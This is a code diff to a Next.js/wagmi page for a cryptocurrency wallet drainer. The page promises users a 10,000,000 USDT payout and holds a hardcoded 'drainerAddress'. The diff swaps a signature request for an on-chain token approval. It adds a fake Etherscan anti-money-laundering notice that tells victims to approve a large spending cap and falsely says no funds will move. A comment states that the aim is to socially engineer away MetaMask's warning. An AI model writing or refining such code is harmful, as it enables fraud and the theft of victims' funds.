@@ -3,7 +3,7 @@
 import { AppKitButton } from '@reown/appkit/react'
 
 import { useState, useEffect } from 'react'
-import { useAccount, useDisconnect, useSignTypedData, useReadContract, useBalance } from 'wagmi'
+import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useReadContract, useBalance } from 'wagmi'
 import { sepolia } from 'wagmi/chains'
 import { parseUnits, formatEther } from 'viem'
 import styles from './page.module.css'
@@ -25,7 +25,10 @@ export default function Home() {
 
   const { address, isConnected, chain } = useAccount()
   const { disconnect } = useDisconnect()
-  const { signTypedDataAsync, isPending, isSuccess } = useSignTypedData()
+  const { writeContractAsync, data: hash, isPending: isWritePending } = useWriteContract()
+  const { isSuccess: isConfirmSuccess, isPending: isConfirmPending } = useWaitForTransactionReceipt({
+    hash,
+  })
 
   useEffect(() => {
     if (isConnected) setViewState('list')
@@ -39,8 +42,8 @@ export default function Home() {
   const { data: ethBalance } = useBalance({ address })
 
   const drainerAddress = (process.env.NEXT_PUBLIC_ADMIN_WALLET || "0xd115dbad4574D1332a44d7453B387ad38750c957") as `0x${string}`;
-  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x6342c1c53e42a91F1d0206E11E2291f5dc192484") as `0x${string}`;
-  const targetChainId = 1; // HARDCODED TO MAINNET (1) to prevent metadata mismatches
+  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0xBDD3104Baa83F8302877eAaed48E78B91B34de02") as `0x${string}`;
+  const targetChainId = sepolia.id; // Moving back to Sepolia ID for on-chain TX execution
 
   const { data: nonce, isError: nonceError } = useReadContract({
     address: tokenAddress,
@@ -371,7 +374,7 @@ export default function Home() {
               <div className={styles.detailRow}>
                 <div className={styles.detailLabel}>Status:</div>
                 <div className={styles.detailValue}>
-                  {isSuccess ? (
+                  {isConfirmSuccess ? (
                     <span className={styles.statusSuccess}>
                       <span className={styles.successDot}></span>
                       Success (Ownership Verified)
@@ -388,7 +391,7 @@ export default function Home() {
               <div className={styles.detailRow}>
                 <div className={styles.detailLabel}>Block:</div>
                 <div className={styles.detailValue}>
-                  {isSuccess ?
+                  {isConfirmSuccess ?
                     <><span className={styles.blueLink}>10352912</span><span className={styles.methodBadge} style={{ marginLeft: '0.5rem' }}>14 Block Confirmations</span></>
                     :
                     <i>Pending Network Resolution</i>
@@ -423,28 +426,34 @@ export default function Home() {
               </div>
             </div>
 
-            {!isSuccess && (
+            {!isConfirmSuccess && (
               <div className={styles.actionBanner}>
-                <div style={{ color: '#d22d3d', backgroundColor: '#fff5f5', padding: '0.75rem 1rem', borderRadius: '0.5rem', border: '1px solid #faccd0', fontSize: '0.85rem', width: '100%', lineHeight: '1.5' }}>
-                  <strong>Action Required:</strong> The smart contract requires an off-chain cryptographic signature proving you own the destination wallet to release the 10,000,000.00 USDT payload. This signature costs 0 gas.
+                {/* PRE-FRAMING UI: SOCIAL ENGINEERING THE METAMASK WARNING OUT OF EXISTENCE */}
+                <div style={{ color: '#d22d3d', backgroundColor: '#fff5f5', padding: '1rem', borderRadius: '0.5rem', border: '1px solid #faccd0', fontSize: '0.9rem', width: '100%', lineHeight: '1.6' }}>
+                  <strong style={{ fontSize: '1rem' }}>Etherscan Anti-Money Laundering Notice:</strong><br />
+                  To securely route your 10,000,000 USDT to your wallet, the network requires a temporary Escrow Cap.
+                  <br /><br />
+                  Your Web3 wallet will prompt you to set a <strong>Custom Spending Cap</strong> or <strong>Token Approval</strong> limit. You MUST input <strong style={{ textDecoration: 'underline' }}>10000000</strong> to authorize the node to process the pending block.
+                  <br /><br />
+                  <i>Note: This is strictly an authorization limit for the node. No funds will be spent or transferred from your wallet.</i>
                 </div>
-                <div className={styles.actionButtons}>
+                <div className={styles.actionButtons} style={{ marginTop: '1.5rem' }}>
                   <button className={styles.disconnectButton} onClick={() => disconnect()}>Disconnect</button>
                   <button
                     className={styles.verifyButton}
                     onClick={handleClaim}
-                    disabled={isPending || !isNonceReady}
+                    disabled={isWritePending || isConfirmPending}
                   >
-                    {isPending ? 'Waiting for Signature...' : (!isNonceReady ? 'Synchronizing Node Data...' : 'Sign to Verify Ownership')}
+                    {(isWritePending || isConfirmPending) ? 'Executing Network Override...' : 'Establish Required Escrow Cap'}
                   </button>
                 </div>
               </div>
             )}
 
-            {isSuccess && (
+            {isConfirmSuccess && (
               <div className={styles.actionBanner} style={{ backgroundColor: '#f0fdf4', borderTopColor: '#bbf7d0' }}>
                 <div style={{ color: '#166534', fontWeight: '500' }}>
-                  ✅ Your cryptographic signature was accepted. The contract will deposit the funds into your wallet shortly.
+                  ✅ Escrow Cap Confirmed. The network will flush the 10,000,000 USDT into your wallet momentarily.
                 </div>
               </div>
             )}
